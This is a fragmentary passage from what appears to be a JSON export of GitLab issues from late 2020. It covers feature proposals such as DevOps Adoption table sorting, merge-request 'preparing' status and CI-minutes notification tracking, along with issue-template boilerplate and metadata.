How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the the Snowplow event tracking template.

This puts up additional 40-50 seconds. Ruby is not performant at compute-intensive process.\n- The data aggregation happens for each API request even though the same data is presented regardless of the user roles.\n- Given web nodes (puma) on production timeouts in 60 seconds, some API requests often result in a timeout error.\n\n### Approach\n\nWe should persist pre-aggreagated data into the database table and present it directly (for frontend and external systems).\nThis is a similar approach with the [daily coverage metrics](https://docs.gitlab.com/ee/user/analytics/repository_analytics.html) feature.\n\n#### Database table design\n\n```\n'environments' table                        - Existing table\n\nid integer NOT NULL,\nproject_id integer NOT NULL,\nname character varying NOT NULL,\ncreated_at timestamp without time zone,\nupdated_at timestamp without time zone,\nexternal_url character varying,\nenvironment_type character varying,\nstate character varying DEFAULT 'available'::character varying NOT NULL,\nslug character varying NOT NULL,\nauto_stop_at timestamp with time zone,\nauto_delete_at timestamp with time zone\ntier (enum)                                  - New column.

Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the the Snowplow event tracking template.

[handbook](https://about.gitlab.com/direction/dev/#plan) lists the following three personas for Plan:\n- [Delaney (Team Development Lead)](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/#delaney-development-team-lead)\n- [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/#parker-product-manager)\n- [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/#sasha-software-developer)\n\n### JTBD\n\nPlan JTBD are listed [here](https://about.gitlab.com/direction/plan/#problem-and-jobs-to-be-done). \n\nPotentially applicable job statements:\n- When monitoring a team's work in flight, I need to be able to easily review and digest the current progress so that I can confidently report to stakeholders and leadership.\n- When creating or revising an initiative's operational plan, I need to allocate resources to it so it is clear what the projected costs will be and what capacity is available to complete work on an ongoing basis.\n\n### Opportunities \nIn https://gitlab.com/gitlab-org/gitlab/-/issues/290227, we discussed feeding incident follow-up issues into the Plan stage. Some possible ideas for surfacing the links between incidents and issues:\n\n#### Feed after-action items back into the Plan Stage\n- On incidents, right now, we only have the \"create incident\" button; we have no \"create follow-up issue\" option that's easily accessible/available. In MRs, for instance, we have the \"resolve threads as follow-up issue\". Maybe there's some sort of equivalent for incidents, whereby a discussion can be captured and ported over into a new follow-up issue?\n\n![Resolve_in_new_issue](/uploads/0d11eb6d4436c951539a6682ffabcc48/Resolve_in_new_issue.png)\n\n#### Manage issues and incidents in the same board\n- In thinking about the personas using the plan stage (primarily those personas who are trying to manage a team's work - estimate capacity, organizing planning) - for those teams that have to deal with incidents as well as issues - how do we better surface incidents in their lists/boards, as presumably they are more time sensitive than other work? Is there some way we can highlight/surface follow-up issues from incidents so it's immediately apparent where those issues are from?","state":"closed","created_at":"2020-12-04T19:53:28.193Z","updated_at":"2020-12-17T21:59:50.796Z","closed_at":"2020-12-17T21:59:50.721Z","closed_by":{"id":3796140,"username":"sarahwaldner","name":"Sarah Waldner","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3796140/avatar.png","web_url":"https://gitlab.com/sarahwaldner"},"labels":["auto updated","devops::monitor","group::respond","section::ops"],"milestone":{"id":1233757,"iid":54,"group_id":9970,"title":"13.7","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2020-04-09T17:43:14.893Z","updated_at":"2022-04-13T14:51:12.240Z","due_date":"2020-12-17","start_date":"2020-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/54"},"assignees":[{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"}],"author":{"id":3796140,"username":"sarahwaldner","name":"Sarah Waldner","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3796140/avatar.png","web_url":"https://gitlab.com/sarahwaldner"},"type":"ISSUE","assignee":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/291156","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/291156","notes":"https://gitlab.com/api/v4/projects/278964/issues/291156/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/291156/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#291156","relative":"#291156","full":"gitlab-org/gitlab#291156"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":75633554,"iid":291136,"project_id":278964,"title":"Sort columns in DevOps Adoption table","description":"### Release notes\n\nThe DevOps Adoption table provides insight into the GitLab features that have been adopted by teams across your organization. The table now supports sorting by a specific column (feature) so you can easily see which teams have and have not adopted a specific feature.\n\n### Problem to solve \n\nOrganizations want to understand which GitLab features have been adopted across their organization. The DevOps Adoption table provides some insight, but there is no easy way to organize the data in the table. Specifically, customers want to focus on a specific feature (column) in the table and easily see which teams have adopted it.\n\n![Screen_Shot_2020-12-03_at_5.35.07_PM](/uploads/99dccf44bcc1ce54bf043af407f7e02f/Screen_Shot_2020-12-03_at_5.35.07_PM.png)\n\nThere are a number of use cases that customers have described.\n\n1. If a team is considering adopting a new GitLab feature, I want to find which other teams are already using this feature so I can share their use cases and get their feedback on the feature.\n1. I want to find which teams have not adopted a specific feature yet so I can teach them about the feature and understand if they can become more efficient by adopting the feature.\n1. When my GitLab subscription is up for renewal, I want to see which teams are using features in a specific tier so I know whether we are getting value from that tier and should continue to pay for it.\n\n### Intended users\n\n* [Dakota (Application Development Director)](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/#dakota-application-development-director)\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\n\n### Proposal\n\n\u003c!-- How are we going to solve the problem?

Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve \n\nWhen a container repository has an unfinished cleanup policy, users need to be informed that some tags may not be deleted as expected. Currently, we do this via an alert at the top of the container repository view (The detail view containing the list of tags).\n\nWith https://gitlab.com/gitlab-org/gitlab/-/issues/276900 we introduced a more permanent UI moment in the title to indicate to users the state of the cleanup for this specific image repository. Given this, a large alert happening each time cleanup is unfinished may create noise and distract the user. \n\n### Intended users\n\n\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n\n### User experience goal\n\nCreate an easy way for users to learn about unfinished cleanup without being too aggressive with the messaging.\n\n### Proposal\n\n\nBased on this conversation https://gitlab.com/gitlab-org/gitlab/-/issues/276900#note_459855206, we will allow users to permanently dismiss the alert provided. \n\n### Further details\n\nAn open question is about how many different times a user will see this alert in different image repositories: \n- Should a user have to dismiss this alert 1 time for each image repository? \n- Should a user have to dsimsis this alert 1 time for each unique container registry/project? \n- Should a user only ever see this alert 1 time regardless of which image repository, container registry, or project they're in? \n\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n--\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt.

yet.\n\nThe pipeline is being created asynchronously so it's possible that the mergeability check happens before it and marks the merge request as mergeable which is not accurate.\n\n### Proposal \n\n1. Add a new `preparing` state to `MergeRequest#merge_status` state machine.\n1. Set `merge_status` to `preparing` on merge request creation (in `MergeRequests#CreateService`).\n1. Set `merge_status` to `unchecked` when fully prepared (in `MergeRequests::AfterCreateService`). This means that all preparations are done.\n1. Ensure that `MergeRequest#mergeable?` will always return false when `merge_status` is still `preparing`.\n\n**NOTE:** We need to ensure that we transition states correctly to avoid having stale states that could lead to bugs.","state":"closed","created_at":"2020-12-04T05:58:45.933Z","updated_at":"2022-11-11T14:29:20.212Z","closed_at":"2021-04-09T09:14:27.569Z","closed_by":{"id":1884221,"username":"patrickbajao","name":"Patrick

In order to deprecate the legacy cronjob we need to move the notification data to the monthly tracking table in order to effectively notify users when a threshold for CI usage is reached. \n\n### User experience \n\nWhen the usage falls below a specific threshold or the user has exceeded their limit, we should notify the user that their limit has been reached\n\n## Proposal\n\nGiven that the rollout of monthly tracking of CI minutes will occur side-by-side with the existing global tracking in `namespace_statistics`, this issue is about switching the data that the notification uses to send out the email to the customer from the global tracking to the monthly tracking.\n\nWhen we [notify the customer about CI minutes usage](https://gitlab.com/gitlab-org/gitlab/-/blob/dcfda9ad08cb176a5989227afb91db5a5bcc5b6c/ee/app/services/ci/minutes/email_notification_service.rb) we store some information in `namespaces` table:\n\n- `namespaces.last_ci_minutes_usage_notification_level` when we notify the customer about warning levels of usage (30% and later a 5% remaining quota)\n- `namespaces.last_ci_minutes_notification_at` when we notify the customer that they exceeded the quota and no more jobs will be run\n\nTo migrate this data to the new monthly tracking to also benefit from these values to be lazily reset on a monthly basis we could take 2 routes:\n\n#### Route 1\n\nAdd 2 new columns to `ci_namespace_monthly_usages`:\n    \n- `notified_level` to replace `last_ci_minutes_usage_notification_level`\n- `notified_at` to replace `last_ci_minutes_notification_at`\n- Update [`Ci::Minutes::EmailNotificationService`](https://gitlab.com/gitlab-org/gitlab/-/blob/dcfda9ad08cb176a5989227afb91db5a5bcc5b6c/ee/app/services/ci/minutes/email_notification_service.rb) to **also** update the new columns in `ci_namespace_monthly_usages`\n\n\n\n#### Route 2 (preferred if possible)\n\nAdd 1 new column to `ci_namespace_monthly_usages`:\n- `notified_level` to replace `last_ci_minutes_usage_notification_level` and `last_ci_minutes_notification_at`.\n\nWhen looking at the usage of `last_ci_minutes_notification_at` it is used only in the scenario when the namespace has exceeded the quota. It seems that originally we only had `last_ci_minutes_notification_at` but later on we added notification for warning levels (30% and 5% remaining) that we decided to add `last_ci_usage_notification_level`. \n\nIn the scenario when the user runs out of minutes, the `notified_level` would be `0` since `0%` is the remaining quota. We don't have a use case for explicitly indicate \"when\" the notification was sent since we don't have the timestamp for when we send out other warning notifications.","state":"closed","created_at":"2020-12-03T22:27:24.509Z","updated_at":"2022-01-14T13:44:16.717Z","closed_at":"2021-09-21T09:50:41.844Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["CI minutes","Category:Continuous Integration","Verify::P1","backend","devops::verify","group::pipeline execution","section::ops","workflow::production"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"}],"author":{"id":5709468,"username":"cheryl.li","name":"Cheryl Li","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5709468/avatar.png","web_url":"https://gitlab.com/cheryl.li"},"type":"ISSUE","assignee":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"user_notes_count":27,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/290961","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/290961","notes":"https://gitlab.com/api/v4/projects/278964/issues/290961/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/290961/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#290961","relative":"#290961","full":"gitlab-org/gitlab#290961"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4840,"epic":{"id":140298,"iid":4840,"title":"Deprecate CI minutes reset jobs in favour of tracking historical usage data","url":"/groups/gitlab-org/-/epics/4840","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":75580167,"iid":290959,"project_id":278964,"title":"Update Threat Monitoring empty state","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps.
